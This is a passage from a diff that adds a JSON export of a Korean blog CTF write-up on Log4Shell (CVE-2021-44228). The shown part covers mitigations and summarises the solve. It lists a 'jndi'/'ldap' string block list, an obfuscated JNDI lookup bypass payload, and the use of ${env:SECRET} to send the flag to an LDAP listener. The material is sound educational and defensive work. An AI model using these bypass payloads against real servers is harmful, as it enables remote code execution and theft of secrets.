+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "7. 대응 방법"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "가장 확실한 방법은 취약한 Log4j 버전을 사용하지 않는 것이다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "Java 버전에 맞는 보안 업데이트가 적용된 Log4j 버전으로 업데이트해야 한다. 문제 자료에서는 Java 8 환경의 경우 2.17.1 이상, Java 7은 2.12.4, Java 6은 2.3.2를 대응 버전으로 정리하고 있다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "추가적으로 다음과 같은 대응이 필요하다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "1. Log4j 보안 업데이트\n\n2. JNDI Lookup 기능 제한\n\n3. 오래된 버전에서는\n   JndiLookup.class 제거\n\n4. 애플리케이션이 외부 LDAP/RMI 서버로\n   불필요하게 연결하지 못하도록 제한\n\n5. log4j-core가 실제 의존성에\n   포함되어 있는지 확인\n\n6. 단순 문자열 필터링에 의존하지 않기\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "특히 이번 문제처럼"
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "jndi\nldap\n"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "문자열만 차단하는 방식은 ${lower:...}와 같은 Lookup 조합으로 우회할 수 있다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "따라서 payload 문자열을 블랙리스트 방식으로 막기보다는 취약한 라이브러리 자체를 업데이트하는 것이 중요하다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": ""
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}:"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "8. 3줄 요약"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "CVE-2021-44228(Log4Shell)은 취약한 Log4j가 ${jndi:...} 표현식을 해석하면서 외부 JNDI 서버에 접근하게 되는 취약점이다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "Log4baby에서는 log4j-core 2.14.1을 사용했고 ${lower:...} Lookup으로 jndi, ldap 필터를 우회한 뒤 ${env:SECRET}으로 FLAG를 가져왔다."
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "최종적으로 FLAG가 포함된 LDAP 요청을 Python 서버에서 수신하여 문제를 해결할 수 있었다."
+          }
+        ]
+      }
+    ]
+  },
+  "source": {
+    "platform": "tistory",
+    "url": "https://yt5246.tistory.com/139",
+    "originalId": "139",
+    "publishedAt": "2026-08-18T23:04:21+09:00",
+    "updatedAt": "2026-08-20T09:55:09+09:00",
+    "importedAt": "2026-10-25T14:17:38+09:00"
+  }
+}
